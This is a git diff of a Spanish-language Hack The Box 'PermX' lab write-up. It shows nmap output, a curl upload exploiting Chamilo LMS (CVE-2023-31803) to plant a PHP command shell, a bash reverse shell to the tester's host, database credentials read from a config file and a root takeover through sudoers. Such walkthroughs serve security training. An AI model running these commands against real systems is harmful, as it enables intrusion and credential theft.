@@ -12,22 +12,32 @@ image: /assets/img/machines/permx/permxbanner.jpeg
 
 ### Skills
 
-Chamilo LMS Exploitation - Unauthenticated Command Injection (CVE-2023-31803) (RCE)
-Subdomain Enumeration
-Information Leakage
-Abusing Sudoers - Custom Bash Script (playing with setfacl) (Privilege Escalation)
+- Chamilo LMS Exploitation - Unauthenticated Command Injection (CVE-2023-31803) (RCE)
+- Subdomain Enumeration
+- Information Leakage
+- Abusing Sudoers - Custom Bash Script (playing with setfacl) (Privilege Escalation)
+
 # Enumeración
 
 ```bash
+nmap -sCV -p22,80 10.10.11.23
 
-nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP MAQUINA> -oG allPorts
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-29 22:12 -04
+Nmap scan report for 10.10.11.23
+Host is up (0.19s latency).
 
-```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
+|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://permx.htb
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-```bash
-
-nmap -sCV -p22,80 <IP MAQUINA> -oN targeted
-
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.43 seconds
 ```
 
 ### Puertos
@@ -51,9 +61,7 @@ Este archivo PHP permite la ejecución remota de comandos en el sistema:
 Subida del archivo rce.php mediante `curl`
 
 ```bash
-
 curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
-
 ```
 
 lanza consulta si se ha subido 
@@ -67,7 +75,6 @@ Este script de Bash abre una conexión desde la víctima hacia `<IP PROPIA>` en 
 
 ```bash
 #!/bin/bash
-
 bash -i >& /dev/tcp/<IP PROPIA>/443 0>&1
 ```
 
@@ -99,7 +106,7 @@ Este archivo contiene la configuración de la aplicación web **Chamilo** (un LM
 www-data@permx:/var/www/chamilo$ cat ./app/config/configuration.php | less -S
 ```
 
-```sql
+```shell
 $_configuration['db_user'] = 'chamilo';
 $_configuration['db_password'] = '03F6lY3uXAP2bkW8';
 ```
@@ -108,7 +115,7 @@ $_configuration['db_password'] = '03F6lY3uXAP2bkW8';
 www-data@permx:/var/www/chamilo$ mysql -u chamilo -p
 ```
 
-```mysql
+```shell
 MariaDB [(none)]> show databases;
 MariaDB [(none)]> use chamilo;
 MariaDB [(none)]> show tables;
@@ -200,7 +207,7 @@ Esto cambia la contraseña de `root` a la generada con `openssl passwd`.
 mtz@permx:~$ su root
 password: hola
 root@permx:~$ cd /root/
-root@permx:~$ car root.txt
+root@permx:~$ cat root.txt
 ```
 
 
